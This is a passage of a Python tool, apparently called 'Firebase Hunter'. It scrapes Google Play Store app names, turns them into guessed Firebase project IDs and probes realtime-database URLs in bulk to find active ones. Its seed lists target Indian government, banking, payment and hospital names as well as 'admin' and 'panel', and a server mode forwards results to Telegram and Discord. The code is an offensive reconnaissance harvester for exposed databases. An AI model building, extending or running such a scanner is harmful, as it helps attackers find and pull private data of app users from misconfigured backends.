    "quiz", "tournament", "contest", "clash", "battle",
]

PS_PKG_RE = re.compile(rb"([a-z][a-z0-9_]{2,30}(?:\.[a-z][a-z0-9_]{2,30}){1,4})")

PS_JUNK_PREFIX = {
    "com", "org", "net", "io", "co", "in", "me", "app", "cc", "us",
    "uk", "de", "fr", "jp", "cn", "ru", "br", "au", "es", "it", "nl",
    "pl", "tr", "kr", "tw", "hk", "sg", "my", "th", "vn", "id", "ph",
    "android", "mobile", "google", "facebook", "amazon", "microsoft",
    "tencent", "alibaba", "baidu", "huawei", "samsung", "xiaomi",
    "vivo", "oppo", "realme", "oneplus", "lg", "sony", "nokia", "htc",
    "adobe", "ea", "gameloft", "rovio", "king", "zynga", "supercell",
    "inc", "llc", "ltd", "corp", "company", "group", "studio", "studios",
    "labs", "team", "apps", "gmbh", "sa", "ag", "srl", "pty", "svc",
    "game", "games", "play", "tv", "hd", "new", "the", "best", "top",
    "pro", "lite", "free", "plus", "premium", "official", "world",
}

PS_JUNK_SUFFIX = {
    "android", "app", "apps", "mobile", "game", "games", "free",
    "pro", "hd", "lite", "plus", "premium", "official", "new",
    "inc", "llc", "ltd", "co", "corp", "company", "studio", "studios",
    "labs", "team", "gmbh", "sa", "ag", "srl", "usa", "global",
    "international", "world", "the", "tv", "media", "online",
    "developer", "soft", "software", "tech", "technologies", "digital",
    "interactive", "entertainment", "network", "networks", "solutions",
}

PS_BAD_RE = re.compile(r"^\d+$")


def ps_fetch(url: str, timeout: int = 25, retries: int = 3):
    for i in range(retries):
        try:
            req = Request(url, headers={
                "User-Agent": random.choice(PS_UA_POOL),
                "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
                "Accept": "text/html,application/xhtml+xml,"
                          "application/xml;q=0.9,*/*;q=0.8",
                "Accept-Encoding": "identity",
                "Connection": "keep-alive",
            })
            with urlopen(req, timeout=timeout) as r:
                return r.read()
        except (URLError, HTTPError, TimeoutError, OSError) as e:
            if i == retries - 1:
                print(f"    ! {type(e).__name__}: {url[:70]}...")
                return None
            time.sleep(1.2 * (i + 1) + random.random())
    return None


def ps_extract_packages(html: bytes) -> set:
    if not html:
        return set()
    packages = set()
    for m in PS_PKG_RE.finditer(html):
        try:
            pkg = m.group(1).decode("ascii", "ignore").lower()
        except Exception:
            continue
        parts = pkg.split(".")
        if len(parts) < 2 or len(parts) > 5:
            continue
        if not all(re.fullmatch(r"[a-z][a-z0-9_]*", p) for p in parts):
            continue
        if all(p in PS_JUNK_PREFIX or p in PS_JUNK_SUFFIX for p in parts):
            continue
        if len(pkg) < 8 or len(pkg) > 60:
            continue
        packages.add(pkg)
    return packages


def ps_pkg_to_base(pkg: str):
    parts = [p for p in pkg.split(".") if p]
    if not parts:
        return None
    while parts and parts[0] in PS_JUNK_PREFIX:
        parts.pop(0)
    while parts and parts[-1] in PS_JUNK_SUFFIX:
        parts.pop()
    if not parts:
        return None
    base = max(parts, key=len).lower()
    base = re.sub(r"[^a-z0-9]", "", base)
    if len(base) < 3 or len(base) > 28:
        return None
    if PS_BAD_RE.match(base):
        return None
    if base in PS_JUNK_PREFIX or base in PS_JUNK_SUFFIX:
        return None
    return base


def ps_url_top(country: str, category: str = "") -> str:
    if category:
        return (f"https://play.google.com/store/apps/category/{category}"
                f"?hl=en&gl={country}")
    return f"https://play.google.com/store/apps?hl=en&gl={country}"


def ps_url_search(country: str, query: str) -> str:
    return (f"https://play.google.com/store/search"
            f"?q={quote_plus(query)}&c=apps&hl=en&gl={country}")


def ps_url_collection(country: str, collection: str = "topselling_free") -> str:
    return (f"https://play.google.com/store/apps/collection/{collection}"
            f"?hl=en&gl={country}")


def ps_harvest_top(countries, categories) -> set:
    out = set()
    for c in countries:
        for cat in categories:
            url = ps_url_top(c, cat)
            print(f"  → top {c} {cat}")
            out |= ps_extract_packages(ps_fetch(url) or b"")
            time.sleep(random.uniform(0.5, 1.2))
    return out


def ps_harvest_collections(countries) -> set:
    colls = ["topselling_free", "topselling_paid", "topgrossing",
             "movers_shakers", "topselling_new_free"]
    out = set()
    for c in countries:
        for coll in colls:
            url = ps_url_collection(c, coll)
            print(f"  → collection {c} {coll}")
            out |= ps_extract_packages(ps_fetch(url) or b"")
            time.sleep(random.uniform(0.5, 1.2))
    return out


def ps_harvest_search(countries, keywords) -> set:
    out = set()
    total = len(countries) * len(keywords)
    i = 0
    for c in countries:
        for kw in keywords:
            i += 1
            url = ps_url_search(c, kw)
            print(f"  → search [{i}/{total}] {c} '{kw}'")
            out |= ps_extract_packages(ps_fetch(url) or b"")
            time.sleep(random.uniform(0.5, 1.2))
    return out


def ps_harvest_seed_file(path: Path) -> set:
    if not path.exists():
        print(f"  ! seed file not found: {path}")
        return set()
    names = set()
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        try:
            host = (urlparse(line if "://" in line else "https://" + line)
                    .hostname or "").lower()
        except Exception:
            continue
        proj = host_to_project(host)
        if not proj:
            continue
        base = _strip_auto_suffix(proj)
        base = re.sub(r"[^a-z0-9-]", "", base.strip("-").lower())
        if 3 <= len(base) <= 28:
            names.add(base)
    print(f"  → {len(names)} base names from {path.name}")
    return names


def ps_load_json_cache() -> dict:
    if PLAY_JSON.exists():
        try:
            data = json.loads(PLAY_JSON.read_text(encoding="utf-8"))
            if isinstance(data, dict):
                return {k: int(v) for k, v in data.items()
                        if isinstance(k, str) and k}
        except Exception:
            pass
    return {}


def ps_save_caches(names: dict):
    PLAY_JSON.write_text(
        json.dumps(names, indent=2, sort_keys=True, ensure_ascii=False),
        encoding="utf-8",
    )
    PLAY_TXT.write_text(
        "\n".join(sorted(names.keys())) + "\n",
        encoding="utf-8",
    )
    print(f"\n[✓] {PLAY_JSON} ({len(names):,} names)")
    print(f"[✓] {PLAY_TXT}")


def run_harvest(argv):
    ap = argparse.ArgumentParser(
        prog="run.py harvest",
        description="Harvest Play Store app names for Firebase base generation")
    ap.add_argument("--countries", default="IN,US,GB,CA,AU")
    ap.add_argument("--categories", default="")
    ap.add_argument("--search", default="")
    ap.add_argument("--seed-file", default="")
    ap.add_argument("--fresh", action="store_true")
    ap.add_argument("--skip-top", action="store_true")
    ap.add_argument("--skip-search", action="store_true")
    ap.add_argument("--skip-collections", action="store_true")
    args = ap.parse_args(argv)

    countries = [c.strip().upper()
                 for c in args.countries.split(",") if c.strip()]
    if not countries:
        print("! no countries specified")
        return

    categories = ([c.strip().upper()
                   for c in args.categories.split(",") if c.strip()]
                  or PS_CATEGORIES[:8])
    keywords = ([k.strip()
                 for k in args.search.split(",") if k.strip()]
                or PS_KEYWORDS[:30])

    print("=" * 62)
    print("Play Store Harvest")
    print("=" * 62)
    print(f"  countries   : {', '.join(countries)}")
    print(f"  categories  : {len(categories)}")
    print(f"  keywords    : {len(keywords)}")
    print(f"  seed file   : {args.seed_file or '(none)'}")
    print(f"  merge cache : {'no (--fresh)' if args.fresh else 'yes'}")
    print("=" * 62)

    t0 = time.time()
    all_packages = set()

    if not args.skip_top:
        print("\n[1/4] Top charts")
        all_packages |= ps_harvest_top(countries, categories)

    if not args.skip_collections:
        print("\n[2/4] Collections")
        all_packages |= ps_harvest_collections(countries)

    if not args.skip_search:
        print("\n[3/4] Search")
        all_packages |= ps_harvest_search(countries, keywords)

    seed_names = set()
    if args.seed_file:
        print("\n[4/4] Seed-file")
        seed_names = ps_harvest_seed_file(Path(args.seed_file))

    print(f"\n[+] Extracted {len(all_packages):,} raw packages")

    base_counts = {}
    for pkg in all_packages:
        base = ps_pkg_to_base(pkg)
        if base:
            base_counts[base] = base_counts.get(base, 0) + 1

    for name in seed_names:
        base_counts[name] = max(base_counts.get(name, 0), 1)

    print(f"[+] Reduced to {len(base_counts):,} unique base names")

    if args.fresh:
        final = base_counts
    else:
        existing = ps_load_json_cache()
        print(f"[+] Existing cache: {len(existing):,} names")
        final = dict(existing)
        for k, v in base_counts.items():
            final[k] = final.get(k, 0) + v

    ps_save_caches(final)
    print(f"\n[✓] Done in {time.time()-t0:.1f}s")
    print(f"    Unique names total: {len(final):,}")


# ═══════════════════════════════════════════════════════════════
#  VERIFY FUNCTIONS
# ═══════════════════════════════════════════════════════════════
DEFAULT_VERIFY_SEEDS = [
    "raj", "rahul", "sanjay", "ramesh", "sonu", "manish", "karan", "amit",
    "suman", "rohit", "siya", "navin", "pintu", "shivam", "pmkisan", "rto",
    "upi", "hospital", "sbi", "panel", "admin",
]


def _verify_run_batch(urls, workers, timeout_per=6.0):
    hits = []
    if not urls:
        return hits
    total_timeout = max(30.0, (len(urls) / max(workers, 1)) * timeout_per * 2)
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(probe, u): u for u in urls}
        try:
            for f in as_completed(futs, timeout=total_timeout):
                try:
                    status, _, _, _ = f.result()
                    if status == "active":
                        hits.append(futs[f])
                except Exception:
                    pass
        except Exception:
            pass
    return hits


def _verify_load_seeds() -> list:
    seeds = _load_seed_bases()
    return seeds if seeds else DEFAULT_VERIFY_SEEDS


def _verify_random_urls(n):
    urls = set()
    attempts = 0
    cap = n * 30
    while len(urls) < n and attempts < cap:
        attempts += 1
        pid = generate_project_id()
        if not pid:
            continue
        u = build_firebase_url(pid)
        if u:
            urls.add(u)
    return list(urls)


def _verify_seed_urls(seeds, n):
    urls = set()
    attempts = 0
    cap = n * 30
    while len(urls) < n and attempts < cap:
        attempts += 1
        base = random.choice(seeds)
        variants = _seed_variants(base)
        if not variants:
            continue
        for v in random.sample(variants, min(len(variants), 3)):
            u = build_firebase_url(v)
            if u:
                urls.add(u)
            if len(urls) >= n:
                break
    return list(urls)


def _verify_playstore_urls(n):
    urls = set()
    if not PLAY_NAMES:
        return []
    attempts = 0
    cap = n * 30
    while len(urls) < n and attempts < cap:
        attempts += 1
        base = random.choice(PLAY_NAMES)
        if not validate_project_id(base):
            continue
        u = build_firebase_url(base)
        if u:
            urls.add(u)
    return list(urls)


def run_verify(argv):
    ap = argparse.ArgumentParser(prog="run.py verify")
    ap.add_argument("n", nargs="?", type=int, default=300)
    ap.add_argument("--workers", type=int, default=48)
    args = ap.parse_args(argv)

    N = max(10, args.n)
    W = max(4, args.workers)
    seeds = _verify_load_seeds()

    print("=" * 60)
    print(f"verify — N={N} workers={W} seeds={len(seeds)}")
    print("=" * 60)

    print(f"\n[1/2] Random generator ({N} URLs)")
    rand_urls = _verify_random_urls(N)
    print(f"      built {len(rand_urls)}")
    rand_hits = _verify_run_batch(rand_urls, W)
    print(f"      {len(rand_hits)}/{len(rand_urls)} = "
          f"{len(rand_hits)/max(len(rand_urls),1)*100:.2f}%")
    for h in rand_hits[:15]:
        print(f"      ✓ {h}")

    print(f"\n[2/2] Seed expansion ({N} URLs)")
    seed_urls = _verify_seed_urls(seeds, N)
    print(f"      built {len(seed_urls)}")
    seed_hits = _verify_run_batch(seed_urls, W)
    print(f"      {len(seed_hits)}/{len(seed_urls)} = "
          f"{len(seed_hits)/max(len(seed_urls),1)*100:.2f}%")
    for h in seed_hits[:15]:
        print(f"      ✓ {h}")

    print("\n" + "=" * 60)
    print(f"RESULT  random={len(rand_hits)}/{len(rand_urls)} "
          f"seed={len(seed_hits)}/{len(seed_urls)}")
    print("=" * 60)


def run_verify_playstore(argv):
    ap = argparse.ArgumentParser(prog="run.py verify-playstore")
    ap.add_argument("n", nargs="?", type=int, default=300)
    ap.add_argument("--workers", type=int, default=48)
    args = ap.parse_args(argv)

    N = max(10, args.n)
    W = max(4, args.workers)

    print("=" * 60)
    print(f"verify-playstore — N={N} workers={W}")
    print("=" * 60)

    if not PLAY_NAMES:
        print(f"\n[!] No Play Store names loaded.")
        print(f"    Expected: {PLAY_JSON}")
        print(f"    Run: python run.py harvest")
        return

    print(f"  Play names: {len(PLAY_NAMES):,}")
    print(f"  Sample: {', '.join(PLAY_NAMES[:10])}...")

    print(f"\n[1/2] Play Store ({N} URLs)")
    ps_urls = _verify_playstore_urls(N)
    print(f"      built {len(ps_urls)}")
    ps_hits = _verify_run_batch(ps_urls, W)
    print(f"      {len(ps_hits)}/{len(ps_urls)} = "
          f"{len(ps_hits)/max(len(ps_urls),1)*100:.2f}%")
    for h in ps_hits[:20]:
        print(f"      ✓ {h}")

    print(f"\n[2/2] Full generator ({N} URLs)")
    gen_urls = _verify_random_urls(N)
    print(f"      built {len(gen_urls)}")
    gen_hits = _verify_run_batch(gen_urls, W)
    print(f"      {len(gen_hits)}/{len(gen_urls)} = "
          f"{len(gen_hits)/max(len(gen_urls),1)*100:.2f}%")
    for h in gen_hits[:20]:
        print(f"      ✓ {h}")

    print("\n" + "=" * 60)
    print(f"RESULT  playstore={len(ps_hits)}/{len(ps_urls)} "
          f"generator={len(gen_hits)}/{len(gen_urls)}")
    print("=" * 60)


# ═══════════════════════════════════════════════════════════════
#  SERVER
# ═══════════════════════════════════════════════════════════════
def run_server():
    init_db()
    load_all_persistent()
    seeds = _load_seed_bases()

    for i in range(WORKERS):
        threading.Thread(target=worker, args=(i + 1,), daemon=True).start()

    if TELEGRAM_ENABLED:
        threading.Thread(target=periodic_file_sender, daemon=True).start()

    srv = ThreadingHTTPServer((HOST, PORT), Handler)
    log("━" * 60)
    log("🔥 FIREBASE HUNTER v7.0 — LEGACY ONLY")
    log("━" * 60)
    log(f"🌐 Server:       http://{HOST}:{PORT}")
    log(f"⚡ Workers:      {WORKERS}")
    log(f"⏱ Timeout:      {TIMEOUT}s")
    log(f"🔗 URL format:   https://[id]-default-rtdb.firebaseio.com")
    log(f"📦 Max URLs:     {MAX_URLS:,}")
    log(f"♻ Auto cap:      {AUTO_MAX_URLS:,}")
    log(f"🌱 Seed bases:   {len(seeds):,}")
    log(f"🏪 Play names:   {len(PLAY_NAMES):,}")
    log(f"💾 Active:       {len(ACTIVE_URLS):,}")
    log(f"✅ Verified:      {len(VERIFIED_URLS):,}")
    log(f"📢 Telegram:     {'✅ ON' if TELEGRAM_ENABLED else '❌ OFF'}")
    log(f"📢 Discord:      {'✅ ON' if DISCORD_ENABLED else '❌ OFF'}")
    log("━" * 60)

    if TELEGRAM_ENABLED:
        tg_startup_msg()

    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        log("Shutting down...")
    finally:
        STOP.set()
        save_all_files()
        srv.server_close()
        log("State saved. Bye.")


# ═══════════════════════════════════════════════════════════════
#  ENTRY
# ═══════════════════════════════════════════════════════════════
def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "serve"

    if mode in ("harvest", "playstore", "play"):
        run_harvest(sys.argv[2:])
        return

    if mode == "verify":
        run_verify(sys.argv[2:])
        return

    if mode in ("verify-playstore", "verify-play"):
        run_verify_playstore(sys.argv[2:])
        return

    if mode in ("serve", "server", "run"):
        run_server()
        return

    if mode.startswith("-"):
        run_server()
        return

    print(f"Unknown mode: {mode}")
    print("Modes: serve (default), harvest, verify, verify-playstore")
    print("  python run.py")
    print("  python run.py harvest --seed-file data/valid.txt")
    print("  python run.py verify 300")
    print("  python run.py verify-playstore 300")


if __name__ == "__main__":
    main()